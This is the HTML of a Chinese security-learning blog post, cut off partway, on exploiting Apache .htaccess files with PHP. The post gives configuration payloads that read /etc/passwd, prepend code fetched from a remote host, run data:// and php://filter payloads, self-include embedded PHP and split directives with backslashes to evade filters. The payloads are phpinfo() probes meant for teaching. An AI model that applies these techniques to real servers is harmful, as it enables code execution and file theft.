@@ -1,0 +1,1243 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='php 拾遗啦'>
+<title>.htaccess 文件利用方式</title>
+
+<link rel='canonical' href='https://d4n-sec.github.io/p/htaccessphpstudy/'>
+
+<link rel="stylesheet" href="/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css"><meta property='og:title' content='.htaccess 文件利用方式'>
+<meta property='og:description' content='php 拾遗啦'>
+<meta property='og:url' content='https://d4n-sec.github.io/p/htaccessphpstudy/'>
+<meta property='og:site_name' content='Dan`s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='.htaccess' /><meta property='article:tag' content='php' /><meta property='article:tag' content='bypass' /><meta property='article:tag' content='exploit' /><meta property='article:published_time' content='2025-01-14T11:21:33&#43;08:00'/><meta property='article:modified_time' content='2025-01-14T11:21:33&#43;08:00'/><meta property='og:image' content='https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250114112548159.png' />
+<meta name="twitter:title" content=".htaccess 文件利用方式">
+<meta name="twitter:description" content="php 拾遗啦"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250114112548159.png' />
+    <link rel="shortcut icon" href="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/paper-plane-64.webp" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    <img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/TX.jpg" width="300" height="300" class="site-logo" loading="lazy" alt="Avatar">
+                
+                </a>
+                
+                    <span class="emoji">🐹</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Dan`s Blog</a></h1>
+            <h2 class="site-description">今人不见古时月</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='/%E5%85%B3%E4%BA%8E'
+                        target="_blank"
+                        title="contactMe"
+                        rel="me"
+                    >
+                        
+                        
+                            <?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg t="1709702435352" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8388" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><path d="M928 160H96c-17.7 0-32 14.3-32 32v640c0 17.7 14.3 32 32 32h832c17.7 0 32-14.3 32-32V192c0-17.7-14.3-32-32-32z m-40 110.8V792H136V270.8l-27.6-21.5 39.3-50.5 42.8 33.3h643.1l42.8-33.3 39.3 50.5-27.7 21.5z" fill="#bfbfbf" p-id="8389"></path><path d="M833.6 232L512 482 190.4 232l-42.8-33.3-39.3 50.5 27.6 21.5 341.6 265.6c20.2 15.7 48.5 15.7 68.7 0L888 270.8l27.6-21.5-39.3-50.5-42.7 33.2z" p-id="8390" fill="#bfbfbf"></path></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/d4n-sec'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='http://wpa.qq.com/msgrd?v=3&amp;uin=1664022865&amp;site=qq&amp;menu=yes'
+                        target="_blank"
+                        title="QQNum"
+                        rel="me"
+                    >
+                        
+                        
+                            
+<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg t="1709702077457" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="13062" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><path d="M824.8 613.2c-16-51.4-34.4-94.6-62.7-165.3C766.5 262.2 689.3 112 511.5 112 331.7 112 256.2 265.2 261 447.9c-28.4 70.8-46.7 113.7-62.7 165.3-34 109.5-23 154.8-14.6 155.8 18 2.2 70.1-82.4 70.1-82.4 0 49 25.2 112.9 79.8 159-26.4 8.1-85.7 29.9-71.6 53.8 11.4 19.3 196.2 12.3 249.5 6.3 53.3 6 238.1 13 249.5-6.3 14.1-23.8-45.3-45.7-71.6-53.8 54.6-46.2 79.8-110.1 79.8-159 0 0 52.1 84.6 70.1 82.4 8.5-1.1 19.5-46.4-14.5-155.8z" p-id="13063" fill="#bfbfbf"></path></svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/tools/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Tools</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+    </ol>
+    <div class="menu-bottom-section">
+        <ol class="menu">
+
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>暗色模式</span>
+                </li>
+            
+        </ol>
+    </div>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#whats-htaccess">What&rsquo;s .htaccess</a></li>
+    <li><a href="#基本使用">基本使用</a>
+      <ol>
+        <li><a href="#自定义出错界面">自定义出错界面</a></li>
+        <li><a href="#sethandler和forcetype">SetHandler和ForceType</a></li>
+        <li><a href="#addhandler">AddHandler</a></li>
+        <li><a href="#addtype">AddType</a></li>
+        <li><a href="#php_value">php_value</a></li>
+      </ol>
+    </li>
+    <li><a href="#可利用思路">可利用思路</a>
+      <ol>
+        <li><a href="#提前延后加载">提前/延后加载</a>
+          <ol>
+            <li><a href="#本地加载">本地加载</a></li>
+            <li><a href="#远程加载">远程加载</a></li>
+          </ol>
+        </li>
+        <li><a href="#自包含">自包含</a></li>
+        <li><a href="#自解析">自解析</a></li>
+        <li><a href="#改变配置">改变配置</a></li>
+        <li><a href="#盲注">盲注</a></li>
+        <li><a href="#正则失效">正则失效</a>
+          <ol>
+            <li><a href="#正则失效的其他配置">正则失效的其他配置</a></li>
+          </ol>
+        </li>
+        <li><a href="#本地文件包含">本地文件包含</a></li>
+        <li><a href="#修改默认路径">修改默认路径</a></li>
+        <li><a href="#cgi执行">Cgi执行</a></li>
+        <li><a href="#fastcgi执行">FastCgi执行</a></li>
+        <li><a href="#lua执行">Lua执行</a></li>
+        <li><a href="#利用报错信息写马">利用报错信息写马</a></li>
+        <li><a href="#绕过exif_imagetype上传htaccess">绕过exif_imagetype()上传.htaccess</a></li>
+        <li><a href="#号绕过waf">\号绕过waf</a></li>
+        <li><a href="#号绕过藏字符">\号绕过藏字符</a></li>
+      </ol>
+    </li>
+    <li><a href="#ref">Ref</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/htaccessphpstudy/">
+                
+                    <img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250114112548159.png" loading="lazy" alt="Featured image of post .htaccess 文件利用方式" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/" >
+                安全学习
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/htaccessphpstudy/">.htaccess 文件利用方式</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            php 拾遗啦
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Jan 14, 2025 11:21 &#43;0800</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 5 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="whats-htaccess">What&rsquo;s .htaccess</h1>
+<p><code>.htaccess</code>文件是 Apache 中有一种特殊的文件，其提供了针对目录改变配置的方法，即在一个特定的文档目录中放置一个包含一条或多条指令的配置文件。此作用文件作用于此目录及其所有子目录。</p>
+<p>作为用户，所能使用的命令受到限制。管理员可以通过 Apache 的 <code>AllowOverride</code> 配置来设置是否识别执行配置文件</p>
+<blockquote>
+<p><code>AllowOverride</code>这个配置是默认关闭的</p>
+</blockquote>
+<p>开启</p>
+<p><code>http.conf</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">AllowOverride All
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>.htaccess</code> 中有 <code>#</code> 单行注释符, 且支持<code>\</code>拼接上下两行（注意后面这个东西很重要）</p>
+<h1 id="基本使用">基本使用</h1>
+<h2 id="自定义出错界面">自定义出错界面</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ErrorDocument <span class="m">401</span> /error/401.php
+</span></span><span class="line"><span class="cl">ErrorDocument <span class="m">403</span> /error/403.php
+</span></span><span class="line"><span class="cl">ErrorDocument <span class="m">404</span> /error/404.php
+</span></span><span class="line"><span class="cl">ErrorDocument <span class="m">500</span> /error/500.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="sethandler和forcetype">SetHandler和ForceType</h2>
+<blockquote>
+<p>强制所有匹配的文件被一个指定的处理器处理</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">ForceType</span> <span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">httpd</span><span class="o">-</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SetHandler</span> <span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">httpd</span><span class="o">-</span><span class="nx">php</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="addhandler">AddHandler</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">AddType application/x-httpd-php .htm <span class="c1"># 则.htm文件也可以执行php程序</span>
+</span></span><span class="line"><span class="cl">AddHandler cgi-script .yyy <span class="c1"># 则扩展名为.yyy的文件作为 CGI 脚本来处理</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="addtype">AddType</h2>
+<p>AddType 可以将给定的文件扩展名映射到指定的内容类型</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">AddType application/x-httpd-php .xxx <span class="c1"># 同上AddHandler的作用</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="php_value">php_value</h2>
+<blockquote>
+<p>当使用 PHP 作为 Apache 模块时，也可以用 Apache 的配置文件（例如<code>httpd.conf</code>）和 <code>.htaccess</code> 文件中的指令来修改 php 的配置设定。需要有<code>AllowOverride Options</code> 或<code>AllowOverride All</code> 权限才可以。</p>
+</blockquote>
+<p><code>php_value</code> 设定指定的值，要清除先前设定的值，把 <code>value</code> 设为 <code>none</code></p>
+<p>不要用 <code>php_value</code> 设定布尔值。应该用<code>php_flag</code></p>
+<p>而<code>.htaccess</code> 只能用于 <code>PHP_INI_ALL</code> 或 <code>PHP_INI_PERDIR</code> 类型的指令；<a class="link" href="https://www.php.net/manual/zh/ini.list.php"  target="_blank" rel="noopener"
+    >官方文档</a></p>
+<h1 id="可利用思路">可利用思路</h1>
+<h2 id="提前延后加载">提前/延后加载</h2>
+<h3 id="本地加载">本地加载</h3>
+<p>文件读取/本地包含</p>
+<p>使作用范围内的php文件在文件头/尾自动<code>include()</code>指定文件，支持php伪协议，<code>.htaccess</code>可以设置<code>php_value include_path &quot;xxx&quot;</code>将<code>include()</code>的默认路径改变</p>
+<p><strong><code>php_value auto_***_file</code></strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"># 提前加载 
+</span></span><span class="line"><span class="cl">php_value auto_prepend_file /etc/passwd
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 最后加载
+</span></span><span class="line"><span class="cl"># php_value auto_append_file /etc/passwd
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="远程加载">远程加载</h3>
+<p>如果开启了<code>allow_url_include</code>可以进行远程预加载，设置好了以后</p>
+<blockquote>
+<p><code>allow_url_include</code>也是默认关闭的。</p>
+<p>因为 <code>all_url_include</code> 的配置范围为 <code>PHP_INI_SYSTEM</code>,所以无法利用 <code>php_flag</code> 在 <code>.htaccess</code> 中开启。</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">php_value auto_prepend_file http://192.168.0.181/phpinfo.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>phpinfo.txt</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">phpinfo</span><span class="p">();</span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>all_url_fopen</code>、<code>all_url_include</code> 为 On 时，下列均成立</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">php_value</span> <span class="nx">auto_append_file</span> <span class="nx">data</span><span class="o">://</span><span class="nx">text</span><span class="o">/</span><span class="nx">plain</span><span class="p">;</span><span class="nx">base64</span><span class="p">,</span><span class="nx">PD9waHAgcGhwaW5mbygpOw</span><span class="o">==</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">php_value</span> <span class="nx">auto_append_file</span> <span class="nx">data</span><span class="o">://</span><span class="nx">text</span><span class="o">/</span><span class="nx">plain</span><span class="p">,</span><span class="o">%</span><span class="mi">3</span><span class="nx">C</span><span class="o">%</span><span class="mi">3</span><span class="nx">Fphp</span><span class="o">+</span><span class="nx">phpinfo</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">php_value</span> <span class="nx">auto_append_file</span> <span class="s2">&#34;php://filter/convert.base64-decode/resource=shell.txt&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="自包含">自包含</h2>
+<p><code>.htaccess</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">php_value auto_prepend_file .htaccess
+</span></span><span class="line"><span class="cl">#<span class="p">&lt;</span>?php phpinfo();?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>有<code>auto_prepend_file</code>过滤</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">php_value auto_prepend_fi<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>le .htaccess
+</span></span><span class="line"><span class="cl"><span class="c1">#&lt;?php phpinfo();</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="自解析">自解析</h2>
+<p>两步配置</p>
+<ol>
+<li>
+<p>先在 .htaccess 里面设置允许访问 .htaccess 文件</p>
+<blockquote>
+<p>否则是直接访问 .htaccess 文件是Forbidden的</p>
+</blockquote>
+</li>
+<li>
+<p>然后再设置将 .htaccess 指定当做 PHP 文件处理并解析</p>
+</li>
+</ol>
+<p>配置文件内容为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;Files</span> <span class="err">.htaccess</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">//ForceType application/x-httpd-php
+</span></span><span class="line"><span class="cl">SetHandler application/x-httpd-php
+</span></span><span class="line"><span class="cl">Require all granted
+</span></span><span class="line"><span class="cl">php_flag engine on
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/Files&gt;</span>
+</span></span><span class="line"><span class="cl">php_value auto_prepend_fi\
+</span></span><span class="line"><span class="cl">le .htaccess
+</span></span><span class="line"><span class="cl">#<span class="err">&lt;</span>?php phpinfo();
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;FilesMatch</span> <span class="err">.htaccess</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">//ForceType application/x-httpd-php
+</span></span><span class="line"><span class="cl">SetHandler application/x-httpd-php
+</span></span><span class="line"><span class="cl">Require all granted
+</span></span><span class="line"><span class="cl">php_flag engine on
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/FilesMatch&gt;</span>
+</span></span><span class="line"><span class="cl">php_value auto_prepend_fi\
+</span></span><span class="line"><span class="cl">le .htaccess
+</span></span><span class="line"><span class="cl">#<span class="err">&lt;</span>?php phpinfo();
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-toml" data-lang="toml"><span class="line"><span class="cl"><span class="nx">SetHandler</span> <span class="nx">application</span><span class="err">/</span><span class="nx">x-httpd-php</span>
+</span></span><span class="line"><span class="cl"><span class="c"># &lt;?php phpinfo(); ?&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>PS：自包含与自解析区别</p>
+<blockquote>
+<p>自解析是自包含+解析<code>.htaccess</code>文件类型配置</p>
+</blockquote>
+<h2 id="改变配置">改变配置</h2>
+<p><code>.htaccess</code>的作用范围默认是当前文件夹及其子文件夹</p>
+<p>我们可以通过配置来修改<code>.htaccess</code>的作用范围</p>
+<p>内的php文件在文件头</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">php_value</span> <span class="nx">include_path</span> <span class="s2">&#34;xxx&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="盲注">盲注</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
